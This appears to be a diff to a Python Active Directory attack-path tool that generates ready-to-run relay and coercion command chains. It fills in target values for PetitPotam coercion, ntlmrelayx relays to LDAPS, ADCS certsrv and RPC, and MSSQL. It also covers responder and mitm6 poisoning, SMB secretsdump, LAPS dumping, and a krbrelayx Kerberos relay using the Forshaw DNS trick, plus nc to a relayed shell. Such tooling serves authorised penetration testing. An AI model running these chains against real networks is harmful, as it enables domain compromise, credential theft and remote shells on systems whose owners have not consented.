@@ -59,7 +59,7 @@ class AttackChain:
     title:       str          # Short name e.g. "DCSync via ACL Abuse"
     prereqs:     str          # Human-readable prerequisite summary
     coerce_cmd:  str          # Coercion command with real values where available
-    relay_cmd:   str          # Relay command with real values where available
+    relay_cmd:   "str | None"  # Relay command (None if relay step is embedded in coerce_cmd)
     notes:       str = ""     # Optional follow-up or caveats
 
 
@@ -91,7 +91,22 @@ def _build_attack_chains(
     dc_ip       = env_summary.get("dc_ip", "<dc-ip>")
     dc_ips      = env_summary.get("dc_ips") or [dc_ip]
     domain      = env_summary.get("domain", "<domain>")
-    attacker    = env_summary.get("attacker_ip") or "<attacker-ip>"
+    attacker          = env_summary.get("attacker_ip") or "<attacker-ip>"
+    attacker_hostname = env_summary.get("attacker_hostname") or "<attacker-hostname>"
+    _hostname_map     = env_summary.get("hostname_map") or {}
+    # Fixed CredMarshalTargetInfo blob suffix (same for all targets)
+    _FORSHAW_BLOB     = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"
+
+    def _forshaw_name(target_ip: str) -> str:
+        """Build the Forshaw DNS name for a given target IP.
+
+        Uses the IP → short hostname map populated at startup via LDAP
+        (for DCs) and reverse DNS (for extra targets).  Falls back to
+        <hostname> placeholder if the IP is not in the map.
+        """
+        short = _hostname_map.get(target_ip)
+        prefix = short if short else "<hostname>"
+        return f"{prefix}{_FORSHAW_BLOB}"
 
     def _get_ar(name_fragment: str) -> "AttackResult | None":
         for ar in results:
@@ -190,10 +205,10 @@ def _build_attack_chains(
             # WebClient is running: coerce over HTTP (WebDAV/UNC) via PetitPotam HTTP mode.
             # The listener argument MUST be a hostname (not IP) — Windows will only follow
             # a WebDAV UNC path to a hostname; an IP triggers SMB, not WebDAV.
-            return (f"# WebDAV coercion (WebClient running — bypasses SMB signing)\n"
-                    f"  python3 PetitPotam.py -u {username} -p '<password>' -d {domain} <attacker-hostname>@80/share {target}")
+            return (f"# Coerce authentication from target\n"
+                    f"  python3 PetitPotam.py -u {username} -p '<password>' -d {domain} {attacker_hostname}@80/share {target}")
         return (f"# Coerce authentication from target\n"
-                f"  printerbug.py {domain}/{username}@{target} {attacker}")
+                f"  python3 PetitPotam.py -u {username} -p '<password>' -d {domain} {attacker_hostname} {target}")
 
     # ── 1. DCSync via ACL Abuse ────────────────────────────────────
     acl_ar = _get_ar("ACL Abuse")
@@ -206,7 +221,8 @@ def _build_attack_chains(
                 prereqs="LDAPS relay viable + writable domain root (WriteDACL) confirmed",
                 coerce_cmd=_coerce_cmd(dc_ip),
                 relay_cmd=(
-                    f"ntlmrelayx.py -t ldaps://{dc_ip} --escalate-user {username}"
+                    f"# Relay to LDAPS and escalate privileges\n"
+                    f"  ntlmrelayx.py -t ldaps://{dc_ip} --escalate-user {username}"
                 ),
                 notes=(
                     "Grants DCSync rights to the enumeration account. "
@@ -225,7 +241,8 @@ def _build_attack_chains(
             prereqs="ADCS ESC8 confirmed — certsrv HTTP endpoint accepts NTLM relay",
             coerce_cmd=_coerce_cmd(dc_ip),
             relay_cmd=(
-                f"ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp "
+                f"# Relay DC auth to certsrv to obtain a DC certificate\n"
+                f"  ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp "
                 f"--adcs --template DomainController"
             ),
             notes=(
@@ -245,7 +262,8 @@ def _build_attack_chains(
             prereqs="ADCS ESC11 confirmed — CA RPC interface accepts NTLM relay",
             coerce_cmd=_coerce_cmd(dc_ip),
             relay_cmd=(
-                f"ntlmrelayx.py -t rpc://{esc11_ca_host} -rpc-mode ICPR "
+                f"# Relay DC auth directly to the CA via RPC\n"
+                f"  ntlmrelayx.py -t rpc://{esc11_ca_host} -rpc-mode ICPR "
                 f"-icpr-ca-name '{esc11_ca_name}' --template DomainController"
             ),
             notes="No certsrv HTTP needed — relays directly over RPC to the CA.",
@@ -260,17 +278,29 @@ def _build_attack_chains(
             title="Domain Compromise via Kerberos Relay → ADCS",
             prereqs="certsrv accepts Negotiate/Kerberos + ADIDNS writable (Forshaw DNS trick)",
             coerce_cmd=(
-                f"# Add ADIDNS record pointing to attacker\n"
+                f"# Register Forshaw DNS A-record pointing to attacker\n"
                 f"  dnstool.py -u '{domain}\\{username}' "
-                f"-p '<pass>' -r '<forshaw_hostname>' -a add -d {attacker} -t A --tcp {dc_ip}\n"
-                f"# Coerce DC (triggers Kerberos auth, not NTLM)\n"
-                f"  printerbug.py {domain}/{username}@{dc_ip} <forshaw_hostname>"
+                f"-p '<pass>' -r '{_forshaw_name(dc_ip)}' -a add -d {attacker} -t A --tcp {dc_ip}\n"
+                f"\n"
+                f"# Start krbrelayx listener\n"
+                f"  sudo krbrelayx.py -t 'http://{krb_ca_host}/certsrv/certfnsh.asp' "
+                f"--adcs --template DomainController "
+                f"-v '{(_hostname_map.get(dc_ip, '<hostname>').upper())}$' "
+                f"-ip {attacker}\n"
+                f"\n"
+                f"# Coerce DC to authenticate to the Forshaw DNS name\n"
+                f"  python3 PetitPotam.py -u '{username}' -p '<pass>' -d {domain} "
+                f"'{_forshaw_name(dc_ip)}' {dc_ip}"
             ),
-            relay_cmd=(
-                f"krbrelayx.py --target http://{krb_ca_host}/certsrv/ "
-                f"--template DomainController"
+            relay_cmd=None,
+            notes=(
+                f"The Forshaw DNS name encodes the target hostname so Windows issues a "
+                f"Kerberos ticket for the real DC SPN but connects to your attacker IP. "
+                f"Works for any coercion target — use the target's short hostname + the "
+                f"fixed CredMarshalTargetInfo blob. "
+                f"If the name shows <hostname>, reverse DNS failed — check with: "
+                f"host {dc_ip}"
             ),
-            notes="Forshaw hostname must resolve to attacker IP via ADIDNS record.",
         ))
 
     # ── 5. Shadow Credentials → PKINIT → NT hash ──────────────────
@@ -288,7 +318,8 @@ def _build_attack_chains(
             ),
             coerce_cmd=_coerce_cmd(dc_ip),
             relay_cmd=(
-                f"ntlmrelayx.py -t ldaps://{dc_ip} --shadow-credentials "
+                f"# Relay to LDAPS and write Shadow Credentials\n"
+                f"  ntlmrelayx.py -t ldaps://{dc_ip} --shadow-credentials "
                 f"--shadow-target {sc_target}$"
             ),
             notes=(
@@ -309,7 +340,8 @@ def _build_attack_chains(
             prereqs=f"LDAP relay viable + writable computer ({rbcd_target}) + MAQ > 0",
             coerce_cmd=_coerce_cmd(dc_ip),
             relay_cmd=(
-                f"ntlmrelayx.py -t ldaps://{dc_ip} --delegate-access"
+                f"# Relay to LDAPS and configure RBCD\n"
+                f"  ntlmrelayx.py -t ldaps://{dc_ip} --delegate-access"
             ),
             notes=(
                 f"Relay writes msDS-AllowedToActOnBehalfOfOtherIdentity on {rbcd_target}. "
@@ -327,10 +359,12 @@ def _build_attack_chains(
             title="SMB Secretsdump — Domain Controller",
             prereqs=f"SMB signing DISABLED on DC: {', '.join(dc_unsigned)}",
             coerce_cmd=(
+                f"# Capture authentication via poisoning\n"
                 f"  sudo responder -I <iface> -dP"
             ),
             relay_cmd=(
-                f"ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
+                f"# Relay to unsigned SMB targets\n"
+                f"  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
             ),
             notes=(
                 "DC with signing disabled — relay gives NTDS.dit equivalent (all domain hashes). "
@@ -346,10 +380,12 @@ def _build_attack_chains(
             title="SMB Secretsdump — Member Server / Workstation",
             prereqs=f"SMB signing DISABLED on: {targets_str}",
             coerce_cmd=(
+                f"# Capture authentication via poisoning\n"
                 f"  sudo responder -I <iface> -dP"
             ),
             relay_cmd=(
-                f"ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
+                f"# Relay to unsigned SMB targets\n"
+                f"  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
             ),
             notes=(
                 "Dumps local SAM + LSA secrets. May include cached domain credentials "
@@ -382,7 +418,7 @@ def _build_attack_chains(
                 f"  sudo mitm6 -d {domain} -i <iface>"
             ),
             relay_cmd=(
-                f"# Relay captured auth to MSSQL for an interactive shell\n"
+                f"# Relay to MSSQL for an interactive shell\n"
                 f"  sudo impacket-ntlmrelayx -6 -t mssql://{mssql_host} -i\n"
                 f"# Connect once relay succeeds\n"
                 f"  nc 127.0.0.1 11000"
@@ -426,7 +462,8 @@ def _build_attack_chains(
             prereqs="LDAP relay viable + LAPS deployed + relay account has LAPS read permission",
             coerce_cmd=_coerce_cmd(dc_ip),
             relay_cmd=(
-                f"ntlmrelayx.py -t ldap://{dc_ip} --dump-laps"
+                f"# Relay to LDAP and dump LAPS passwords\n"
+                f"  ntlmrelayx.py -t ldap://{dc_ip} --dump-laps"
             ),
             notes=(
                 "Dumps local Administrator passwords for LAPS-managed computers. "
@@ -443,7 +480,8 @@ def _build_attack_chains(
             prereqs=f"LDAPS relay viable + MAQ > 0 on {dc_ip}",
             coerce_cmd=_coerce_cmd(dc_ip),
             relay_cmd=(
-                f"ntlmrelayx.py -t ldaps://{dc_ip} --add-computer"
+                f"# Relay to LDAPS and create a machine account\n"
+                f"  ntlmrelayx.py -t ldaps://{dc_ip} --add-computer"
             ),
             notes=(
                 "Creates an attacker-controlled machine account. "
@@ -489,19 +527,33 @@ def _print_rich_attack_paths(chains: list[AttackChain]) -> None:
         console.print(f"  [dim]Prerequisites:[/] {chain.prereqs}", highlight=False)
         console.print()
 
+        first_coerce = True
         for line in chain.coerce_cmd.splitlines():
-            if line.strip().startswith("#"):
+            if not line.strip():
+                pass  # blank lines in source drive spacing via # detection
+            elif line.strip().startswith("#"):
+                if not first_coerce:
+                    console.print()
                 console.print(f"    [white]{line.strip()}[/]", highlight=False)
+                first_coerce = False
             else:
                 console.print(f"    [green]{line.strip()}[/]", highlight=False)
+                first_coerce = False
 
-        for line in chain.relay_cmd.splitlines():
-            if line.strip().startswith("#"):
+        first_relay = True
+        for line in (chain.relay_cmd or "").splitlines():
+            if not line.strip():
+                pass
+            elif line.strip().startswith("#"):
+                console.print()
                 console.print(f"    [white]{line.strip()}[/]", highlight=False)
+                first_relay = False
             else:
                 console.print(f"    [cyan]{line.strip()}[/]", highlight=False)
+                first_relay = False
 
         if chain.notes:
+            console.print()
             console.print(f"  [dim]↳ {chain.notes}[/]", highlight=False)
 
         if i < len(chains):
@@ -520,11 +572,29 @@ def _print_plain_attack_paths(chains: list[AttackChain]) -> None:
     for i, chain in enumerate(chains, 1):
         print(f"\n  [{chain.tier}] {chain.title}")
         print(f"  Prerequisites: {chain.prereqs}")
+        first_coerce = True
         for line in chain.coerce_cmd.splitlines():
-            print(f"    {line.strip()}")
-        print(f"    {chain.relay_cmd}")
+            if not line.strip():
+                pass
+            elif line.strip().startswith("#"):
+                if not first_coerce:
+                    print()
+                print(f"    {line.strip()}")
+                first_coerce = False
+            else:
+                print(f"    {line.strip()}")
+                first_coerce = False
+        for line in (chain.relay_cmd or "").splitlines():
+            if not line.strip():
+                pass
+            elif line.strip().startswith("#"):
+                print()
+                print(f"    {line.strip()}")
+            else:
+                print(f"    {line.strip()}")
         if chain.notes:
-            print(f"  Note: {chain.notes}")
+            print()
+            print(f"  ↳ {chain.notes}")
         if i < len(chains):
             print(f"\n  {'-' * 86}")
     print()
@@ -838,7 +908,8 @@ def write_markdown_report(
                 a(line)
             a("")
             a("# Relay")
-            a(chain.relay_cmd)
+            if chain.relay_cmd:
+                a(chain.relay_cmd)
             a("```")
             a("")
 
@@ -1023,7 +1094,7 @@ def write_json_report(
                 "title":    c.title,
                 "prereqs":  c.prereqs,
                 "coerce":   c.coerce_cmd,
-                "relay":    c.relay_cmd,
+                "relay":    c.relay_cmd or "",
                 "notes":    c.notes or "",
             }
             for c in chains
@@ -1244,7 +1315,7 @@ def write_html_report(
             colour     = TIER_COLOUR.get(chain.tier, "#e2e8f0")
             tier_label = TIER_LABEL.get(chain.tier, chain.tier)
             coerce_escaped = esc(chain.coerce_cmd).replace("\n", "<br>")
-            relay_escaped  = esc(chain.relay_cmd)
+            relay_escaped  = esc(chain.relay_cmd or "")
             notes_html = f'<p style="font-size:12px;color:#a0aec0;margin:4px 0 0 0">↳ {esc(chain.notes)}</p>' if chain.notes else ""
             paths_html += f"""
       <div style="border-left:3px solid {colour};padding:10px 16px;margin-bottom:18px;background:#1a202c;border-radius:4px">
